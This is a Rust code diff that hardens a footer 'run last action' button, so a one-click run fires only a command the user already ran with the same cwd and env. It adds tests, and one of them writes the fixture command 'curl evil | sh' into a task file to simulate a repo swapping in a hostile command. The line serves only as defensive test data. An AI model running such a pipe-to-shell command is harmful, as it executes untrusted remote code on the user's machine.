@@ -1,7 +1,7 @@
 //! Actions: project commands the footer runs in a dock terminal with one
 //! click. They come from every source core detects, plus the personal ones
-//! saved here. The button shows the last action run; its chevron lists the
-//! rest and opens the editor.
+//! saved here. The button runs the last action run, while it still runs the
+//! same command; its chevron lists the rest and opens the editor.
 use super::*;
 use crate::workspace::{ACTION_ICONS, ProjectAction};
 use gespan_core::project_actions::{self as project_actions, Action, Listing};
@@ -58,6 +58,13 @@ fn expand_env(env: &[(String, String)]) -> Vec<(String, String)> {
             (name.clone(), value)
         })
         .collect()
+}
+
+/// What `action` runs: its command, cwd and env. A repo can change any of
+/// them, and a one-click run must run only what the user already ran.
+fn fingerprint(action: &Action) -> String {
+    let cwd = action.cwd.to_string_lossy();
+    serde_json::to_string(&(&action.command, cwd, &action.env)).unwrap_or_default()
 }
 
 /// The menu row for `action`: its detail or command beneath, or why it
@@ -122,16 +129,43 @@ impl Shell {
             .filter(|l| l.project == self.workspace.project)
             .map_or(&[], |l| l.listing.actions.as_slice())
     }
-    /// The action the footer button runs: the last one run, else the first
-    /// one that can run.
-    fn current_action(&self) -> Option<&Action> {
-        let actions = self.actions();
-        self.workspace
-            .last_actions
-            .get(&self.workspace.project)
-            .and_then(|id| find(actions, id))
-            .filter(|a| a.blocked.is_none())
-            .or_else(|| actions.iter().find(|a| a.blocked.is_none()))
+    /// The action the footer button runs: the last one run from here, only
+    /// while it still runs the same command, cwd and env. Nothing else is
+    /// trusted for one click, so a fresh clone's button opens the menu.
+    fn footer_action(&self) -> Option<&Action> {
+        let project = &self.workspace.project;
+        let trusted = self.workspace.last_action_fingerprints.get(project)?;
+        let id = self.workspace.last_actions.get(project)?;
+        find(self.actions(), id)
+            .filter(|a| a.blocked.is_none() && !trusted.is_empty() && fingerprint(a) == *trusted)
+    }
+    /// Detects the actions again, keeping the open menu's expanded sections.
+    fn redetect(&mut self, cx: &App) {
+        self.action_listing = Some(ActionListing {
+            project: self.workspace.project.clone(),
+            checkout: self.terminal_cwd(cx),
+            listing: self.listing(cx),
+        });
+    }
+    /// The footer button: runs [`Self::footer_action`] as it is on disk now,
+    /// or opens the menu when there is none.
+    pub(super) fn run_footer_action(&mut self, window: &mut Window, cx: &mut Context<Self>) {
+        if self.workspace.project.starts_with("remote://") {
+            return;
+        }
+        self.redetect(cx);
+        match self.footer_action().cloned() {
+            Some(action) => self.launch_action(action, window, cx),
+            None => self.toggle_actions_menu(window, cx),
+        }
+    }
+    fn toggle_actions_menu(&mut self, window: &mut Window, cx: &mut Context<Self>) {
+        if self.menu_open(&MenuTarget::Actions) {
+            self.close_menu(cx);
+        } else {
+            let anchor = Anchor::Slot(self.actions_anchor.clone());
+            self.open_menu(MenuTarget::Actions, anchor, window, cx);
+        }
     }
     /// Shows or hides a long section's rows in the open menu.
     pub(super) fn toggle_action_section(&mut self, section: &str) {
@@ -150,22 +184,25 @@ impl Shell {
             cx.notify();
             return;
         }
-        let checkout = self.terminal_cwd(cx);
-        let listing = self.listing(cx);
-        let action = find(&listing.actions, id).cloned();
-        self.action_listing = Some(ActionListing {
-            project: project.clone(),
-            checkout,
-            listing,
-        });
-        let Some(action) = action.filter(|a| a.blocked.is_none()) else {
+        self.redetect(cx);
+        let action = find(self.actions(), id).filter(|a| a.blocked.is_none());
+        let Some(action) = action.cloned() else {
+            // It went away or can no longer run; the footer shows that.
+            cx.notify();
             return;
         };
+        self.launch_action(action, window, cx);
+    }
+    fn launch_action(&mut self, action: Action, window: &mut Window, cx: &mut Context<Self>) {
+        let project = self.workspace.project.clone();
         let cwd = action.cwd.to_string_lossy().into_owned();
         let env = expand_env(&action.env);
         self.workspace
             .last_actions
             .insert(project.clone(), action.id.clone());
+        self.workspace
+            .last_action_fingerprints
+            .insert(project.clone(), fingerprint(&action));
         self.ensure_terminals(&project, cx);
         let key = (project.clone(), action.id.clone());
         let live = self.terminals.get(&project).cloned().unwrap_or_default();
@@ -292,7 +329,7 @@ impl Shell {
                     .into(),
                 );
             } else {
-                items.push(MenuItem::Header(SharedString::from(name.to_owned())));
+                items.push(MenuItem::Caption(SharedString::from(name.to_owned())));
                 items.extend(rows);
             }
         }
@@ -335,8 +372,6 @@ impl Shell {
             self.run_action(id, window, cx);
         } else if let Some(id) = action.strip_prefix("edit:") {
             self.open_action_dialog(Some(id.to_owned()), window, cx);
-        } else if let Some(section) = action.strip_prefix(EXPAND) {
-            self.toggle_action_section(section);
         }
     }
 
@@ -346,7 +381,7 @@ impl Shell {
             return None;
         }
         let classic = self.workspace.boxy_layout();
-        let current = self.current_action().cloned();
+        let current = self.footer_action().cloned();
         let menu_open = self.menu_open(&MenuTarget::Actions);
         // Each part rounds fully inside the frame's 2px inset.
         let outer = if classic { 6. } else { 10. };
@@ -366,30 +401,25 @@ impl Shell {
         };
         let pad = px(if classic { 4. } else { 6. });
         let main = match &current {
-            Some(action) => {
-                let id = action.id.clone();
-                segment("footer-action-run")
-                    .aria_label(SharedString::from(format!("Run {}", action.label)))
-                    .aria_description(SharedString::from(action.command.clone()))
-                    .px(pad)
-                    .gap(px(6.))
-                    .max_w(px(180.))
-                    .min_w_0()
-                    .child(icon(action.icon, 12.).text_color(content(0.55)))
-                    .child(div().min_w_0().truncate().child(action.label.clone()))
-                    .on_click(
-                        cx.listener(move |this, _, window, cx| this.run_action(&id, window, cx)),
-                    )
-            }
-            None => segment("footer-action-add")
-                .aria_label("Add action")
+            Some(action) => segment("footer-action-run")
+                .aria_label(SharedString::from(format!("Run {}", action.label)))
+                .aria_description(SharedString::from(action.command.clone()))
+                .px(pad)
+                .gap(px(6.))
+                .max_w(px(180.))
+                .min_w_0()
+                .child(icon(action.icon, 12.).text_color(content(0.55)))
+                .child(div().min_w_0().truncate().child(action.label.clone()))
+                .on_click(cx.listener(|this, _, window, cx| this.run_footer_action(window, cx))),
+            // Nothing trusted to run: the button opens the menu.
+            None => segment("footer-action-open")
+                .aria_label("Actions")
+                .aria_expanded(menu_open)
                 .px(pad)
                 .gap(px(6.))
                 .child(icon("play", 12.).text_color(content(0.55)))
                 .child("Actions")
-                .on_click(
-                    cx.listener(|this, _, window, cx| this.open_action_dialog(None, window, cx)),
-                ),
+                .on_click(cx.listener(|this, _, window, cx| this.run_footer_action(window, cx))),
         };
         let chevron = segment("footer-action-menu")
             .aria_label("Actions")
@@ -399,14 +429,7 @@ impl Shell {
             .when(menu_open, |d| d.bg(content(0.08)).text_color(content(1.)))
             .child(self.actions_anchor.probe())
             .child(icon("chevron-down", 12.).text_color(content(0.55)))
-            .on_click(cx.listener(|this, _, window, cx| {
-                if this.menu_open(&MenuTarget::Actions) {
-                    this.close_menu(cx);
-                } else {
-                    let anchor = Anchor::Slot(this.actions_anchor.clone());
-                    this.open_menu(MenuTarget::Actions, anchor, window, cx);
-                }
-            }));
+            .on_click(cx.listener(|this, _, window, cx| this.toggle_actions_menu(window, cx)));
         Some(
             div()
                 .id("footer-actions")
@@ -543,6 +566,7 @@ impl Shell {
             .is_some_and(|last| *last == id || *last == full)
         {
             self.workspace.last_actions.remove(&project);
+            self.workspace.last_action_fingerprints.remove(&project);
         }
         self.action_terminals.remove(&(project, full));
         self.sync_personal();
@@ -758,6 +782,7 @@ impl Shell {
 
 #[cfg(test)]
 mod tests {
+    use super::MenuTarget;
     use crate::popover::MenuItem;
     use crate::shell::Shell;
     use crate::workspace::ProjectAction;
@@ -784,13 +809,14 @@ mod tests {
         shell.sessions[&active].update(cx, |chat, _| chat.settings.worktree_cwd = Some(path));
     }
 
-    /// Each row as text: `# header`, `---`, or `label | description`, with
-    /// `(off)` on disabled rows.
+    /// Each row as text: `# caption` (case kept), `header TEXT`, `---`, or
+    /// `label | description`, with `(off)` on disabled rows.
     fn rows(items: &[MenuItem]) -> Vec<String> {
         items
             .iter()
             .map(|item| match item {
-                MenuItem::Header(text) => format!("# {text}"),
+                MenuItem::Header(text) => format!("header {text}"),
+                MenuItem::Caption(text) => format!("# {text}"),
                 MenuItem::Separator => "---".into(),
                 MenuItem::Note(text) => format!("note {text}"),
                 MenuItem::Custom(..) => "custom".into(),
@@ -921,7 +947,7 @@ mod tests {
                     "gespan:Web".to_string()
                 );
                 assert_eq!(
-                    shell.current_action().map(|a| a.id.clone()),
+                    shell.footer_action().map(|a| a.id.clone()),
                     Some("gespan:Web".into())
                 );
 
@@ -956,6 +982,28 @@ mod tests {
                 assert_eq!(terminals[2].read(cx).cwd, cwd(&root.join("api")));
             })
             .unwrap();
+        // Only its env changes: same cwd, still a fresh terminal.
+        write(
+            root,
+            ".gespan/tasks.json",
+            &tasks(
+                r#"{ "label": "Web", "command": "echo web",
+                     "options": { "cwd": "api", "env": { "MODE": "dev" } } }"#,
+            ),
+        );
+        window
+            .update(cx, |shell, window, cx| {
+                let project = shell.workspace.project.clone();
+                for t in &shell.terminals[&project] {
+                    t.update(cx, |t, _| t.foreground = None);
+                }
+                shell.run_action("gespan:Web", window, cx);
+                let terminals = shell.terminals[&project].clone();
+                assert_eq!(terminals.len(), 4);
+                assert_eq!(terminals[3].read(cx).cwd, cwd(&root.join("api")));
+                assert_eq!(terminals[3].read(cx).env, [("MODE".into(), "dev".into())]);
+            })
+            .unwrap();
     }
 
     #[gpui::test]
@@ -985,9 +1033,8 @@ mod tests {
                     .insert(project.clone(), "abc".into());
                 shell.sync_personal();
                 shell.refresh_actions(cx);
-                let current = shell.current_action().cloned().unwrap();
-                assert_eq!(current.id, "personal:abc");
-                assert_eq!(current.label, "Deploy");
+                // Nothing says what it ran, so one click doesn't run it.
+                assert!(shell.footer_action().is_none());
 
                 // The bare id still runs it, at the checkout root.
                 shell.run_action("abc", window, cx);
@@ -995,16 +1042,24 @@ mod tests {
                 assert_eq!(terminals.len(), 1);
                 assert_eq!(terminals[0].read(cx).cwd, cwd(root));
                 assert_eq!(shell.workspace.last_actions[&project], "personal:abc");
+                let current = shell.footer_action().cloned().unwrap();
+                assert_eq!(
+                    (current.id.as_str(), current.label.as_str()),
+                    ("personal:abc", "Deploy")
+                );
 
                 // Deleting it forgets it as the last one run.
                 shell.open_action_dialog(Some("abc".into()), window, cx);
                 shell.delete_action(window, cx);
                 assert!(!shell.workspace.last_actions.contains_key(&project));
-                shell.refresh_actions(cx);
-                assert_eq!(
-                    shell.current_action().map(|a| a.id.clone()),
-                    Some("package.json:dev".into())
+                assert!(
+                    !shell
+                        .workspace
+                        .last_action_fingerprints
+                        .contains_key(&project)
                 );
+                shell.refresh_actions(cx);
+                assert!(shell.footer_action().is_none());
                 // Gone for agents too.
                 let listing = gespan_core::project_actions::detect(&project, root);
                 assert!(listing.actions.iter().all(|a| a.source != "personal"));
@@ -1048,16 +1103,86 @@ mod tests {
                     rows[header + 1],
                     format!("Couldn't read .vscode/tasks.json: {} (off)", error.reason)
                 );
-                // The first runnable one is the footer's default.
-                assert_eq!(
-                    shell.current_action().map(|a| a.id.clone()),
-                    Some("gespan:Fine".into())
-                );
+                // Nothing was run here, so the footer runs nothing.
+                assert!(shell.footer_action().is_none());
 
                 // A blocked action never runs.
                 shell.run_action("gespan:Pick", window, cx);
                 assert!(shell.terminals.get(&project).is_none_or(Vec::is_empty));
                 assert!(!shell.workspace.last_actions.contains_key(&project));
+            })
+            .unwrap();
+    }
+
+    #[gpui::test]
+    fn the_footer_runs_only_what_was_already_run_unchanged(cx: &mut gpui::TestAppContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        write(root, "package.json", r#"{ "scripts": { "dev": "vite" } }"#);
+        let web =
+            |command: &str| tasks(&format!(r#"{{ "label": "Web", "command": "{command}" }}"#));
+        write(root, ".gespan/tasks.json", &web("echo web"));
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                let project = shell.workspace.project.clone();
+                let count = |shell: &Shell| shell.terminals.get(&project).map_or(0, Vec::len);
+                // A fresh clone: the button opens the menu and runs nothing.
+                shell.refresh_actions(cx);
+                assert!(shell.footer_action().is_none());
+                shell.run_footer_action(window, cx);
+                assert!(shell.menu_open(&MenuTarget::Actions));
+                assert_eq!(count(shell), 0);
+                shell.close_menu(cx);
+
+                // Run from the menu, it becomes the button's.
+                shell.run_actions_menu("run:gespan:Web", window, cx);
+                assert_eq!(count(shell), 1);
+                assert_eq!(
+                    shell.footer_action().map(|a| a.command.clone()),
+                    Some("echo web".into())
+                );
+                shell.run_footer_action(window, cx);
+                assert_eq!(count(shell), 2);
+                assert!(!shell.menu_open(&MenuTarget::Actions));
+            })
+            .unwrap();
+        // The repo changes what it runs: one click no longer runs it.
+        write(root, ".gespan/tasks.json", &web("curl evil | sh"));
+        window
+            .update(cx, |shell, window, cx| {
+                let project = shell.workspace.project.clone();
+                shell.run_footer_action(window, cx);
+                assert!(shell.menu_open(&MenuTarget::Actions));
+                assert_eq!(shell.terminals[&project].len(), 2);
+                assert!(shell.footer_action().is_none());
+                shell.close_menu(cx);
+
+                // A personal action gets no special trust: saving it isn't
+                // enough, and changing its command needs a new run.
+                shell.open_action_dialog(None, window, cx);
+                let dialog = shell.action_dialog.as_mut().unwrap();
+                let (name, command) = (dialog.name.clone(), dialog.command.clone());
+                name.update(cx, |i, cx| i.set_text("Deploy".into(), cx));
+                command.update(cx, |i, cx| i.set_text("./deploy.sh".into(), cx));
+                shell.save_action(window, cx);
+                assert!(shell.footer_action().is_none());
+                let id = shell.workspace.actions[&project][0].id.clone();
+                shell.run_action(&id, window, cx);
+                assert_eq!(shell.terminals[&project].len(), 3);
+                assert_eq!(
+                    shell.footer_action().map(|a| a.id.clone()),
+                    Some(format!("personal:{id}"))
+                );
+                shell.open_action_dialog(Some(id), window, cx);
+                let command = shell.action_dialog.as_ref().unwrap().command.clone();
+                command.update(cx, |i, cx| i.set_text("./deploy.sh --prod".into(), cx));
+                shell.save_action(window, cx);
+                assert!(shell.footer_action().is_none());
+                shell.run_footer_action(window, cx);
+                assert!(shell.menu_open(&MenuTarget::Actions));
+                assert_eq!(shell.terminals[&project].len(), 3);
             })
             .unwrap();
     }
@@ -1078,13 +1203,15 @@ mod tests {
                 let project = shell.workspace.project.clone();
                 let action = shell.workspace.actions[&project][0].clone();
                 assert_eq!((action.name.as_str(), action.icon()), ("Deploy", "rocket"));
-                assert_eq!(
-                    shell.current_action().map(|a| a.id.clone()),
-                    Some(format!("personal:{}", action.id))
-                );
+                // Saving isn't running: the footer waits for a first run.
+                assert!(shell.footer_action().is_none());
 
                 shell.run_action(&action.id, window, cx);
                 assert_eq!(shell.terminals[&project].len(), 1);
+                assert_eq!(
+                    shell.footer_action().map(|a| a.id.clone()),
+                    Some(format!("personal:{}", action.id))
+                );
                 assert!(shell.workspace.docks[&project].open);
                 // The terminal is still busy with the first run, so a second
                 // run opens another; once idle, it is reused.
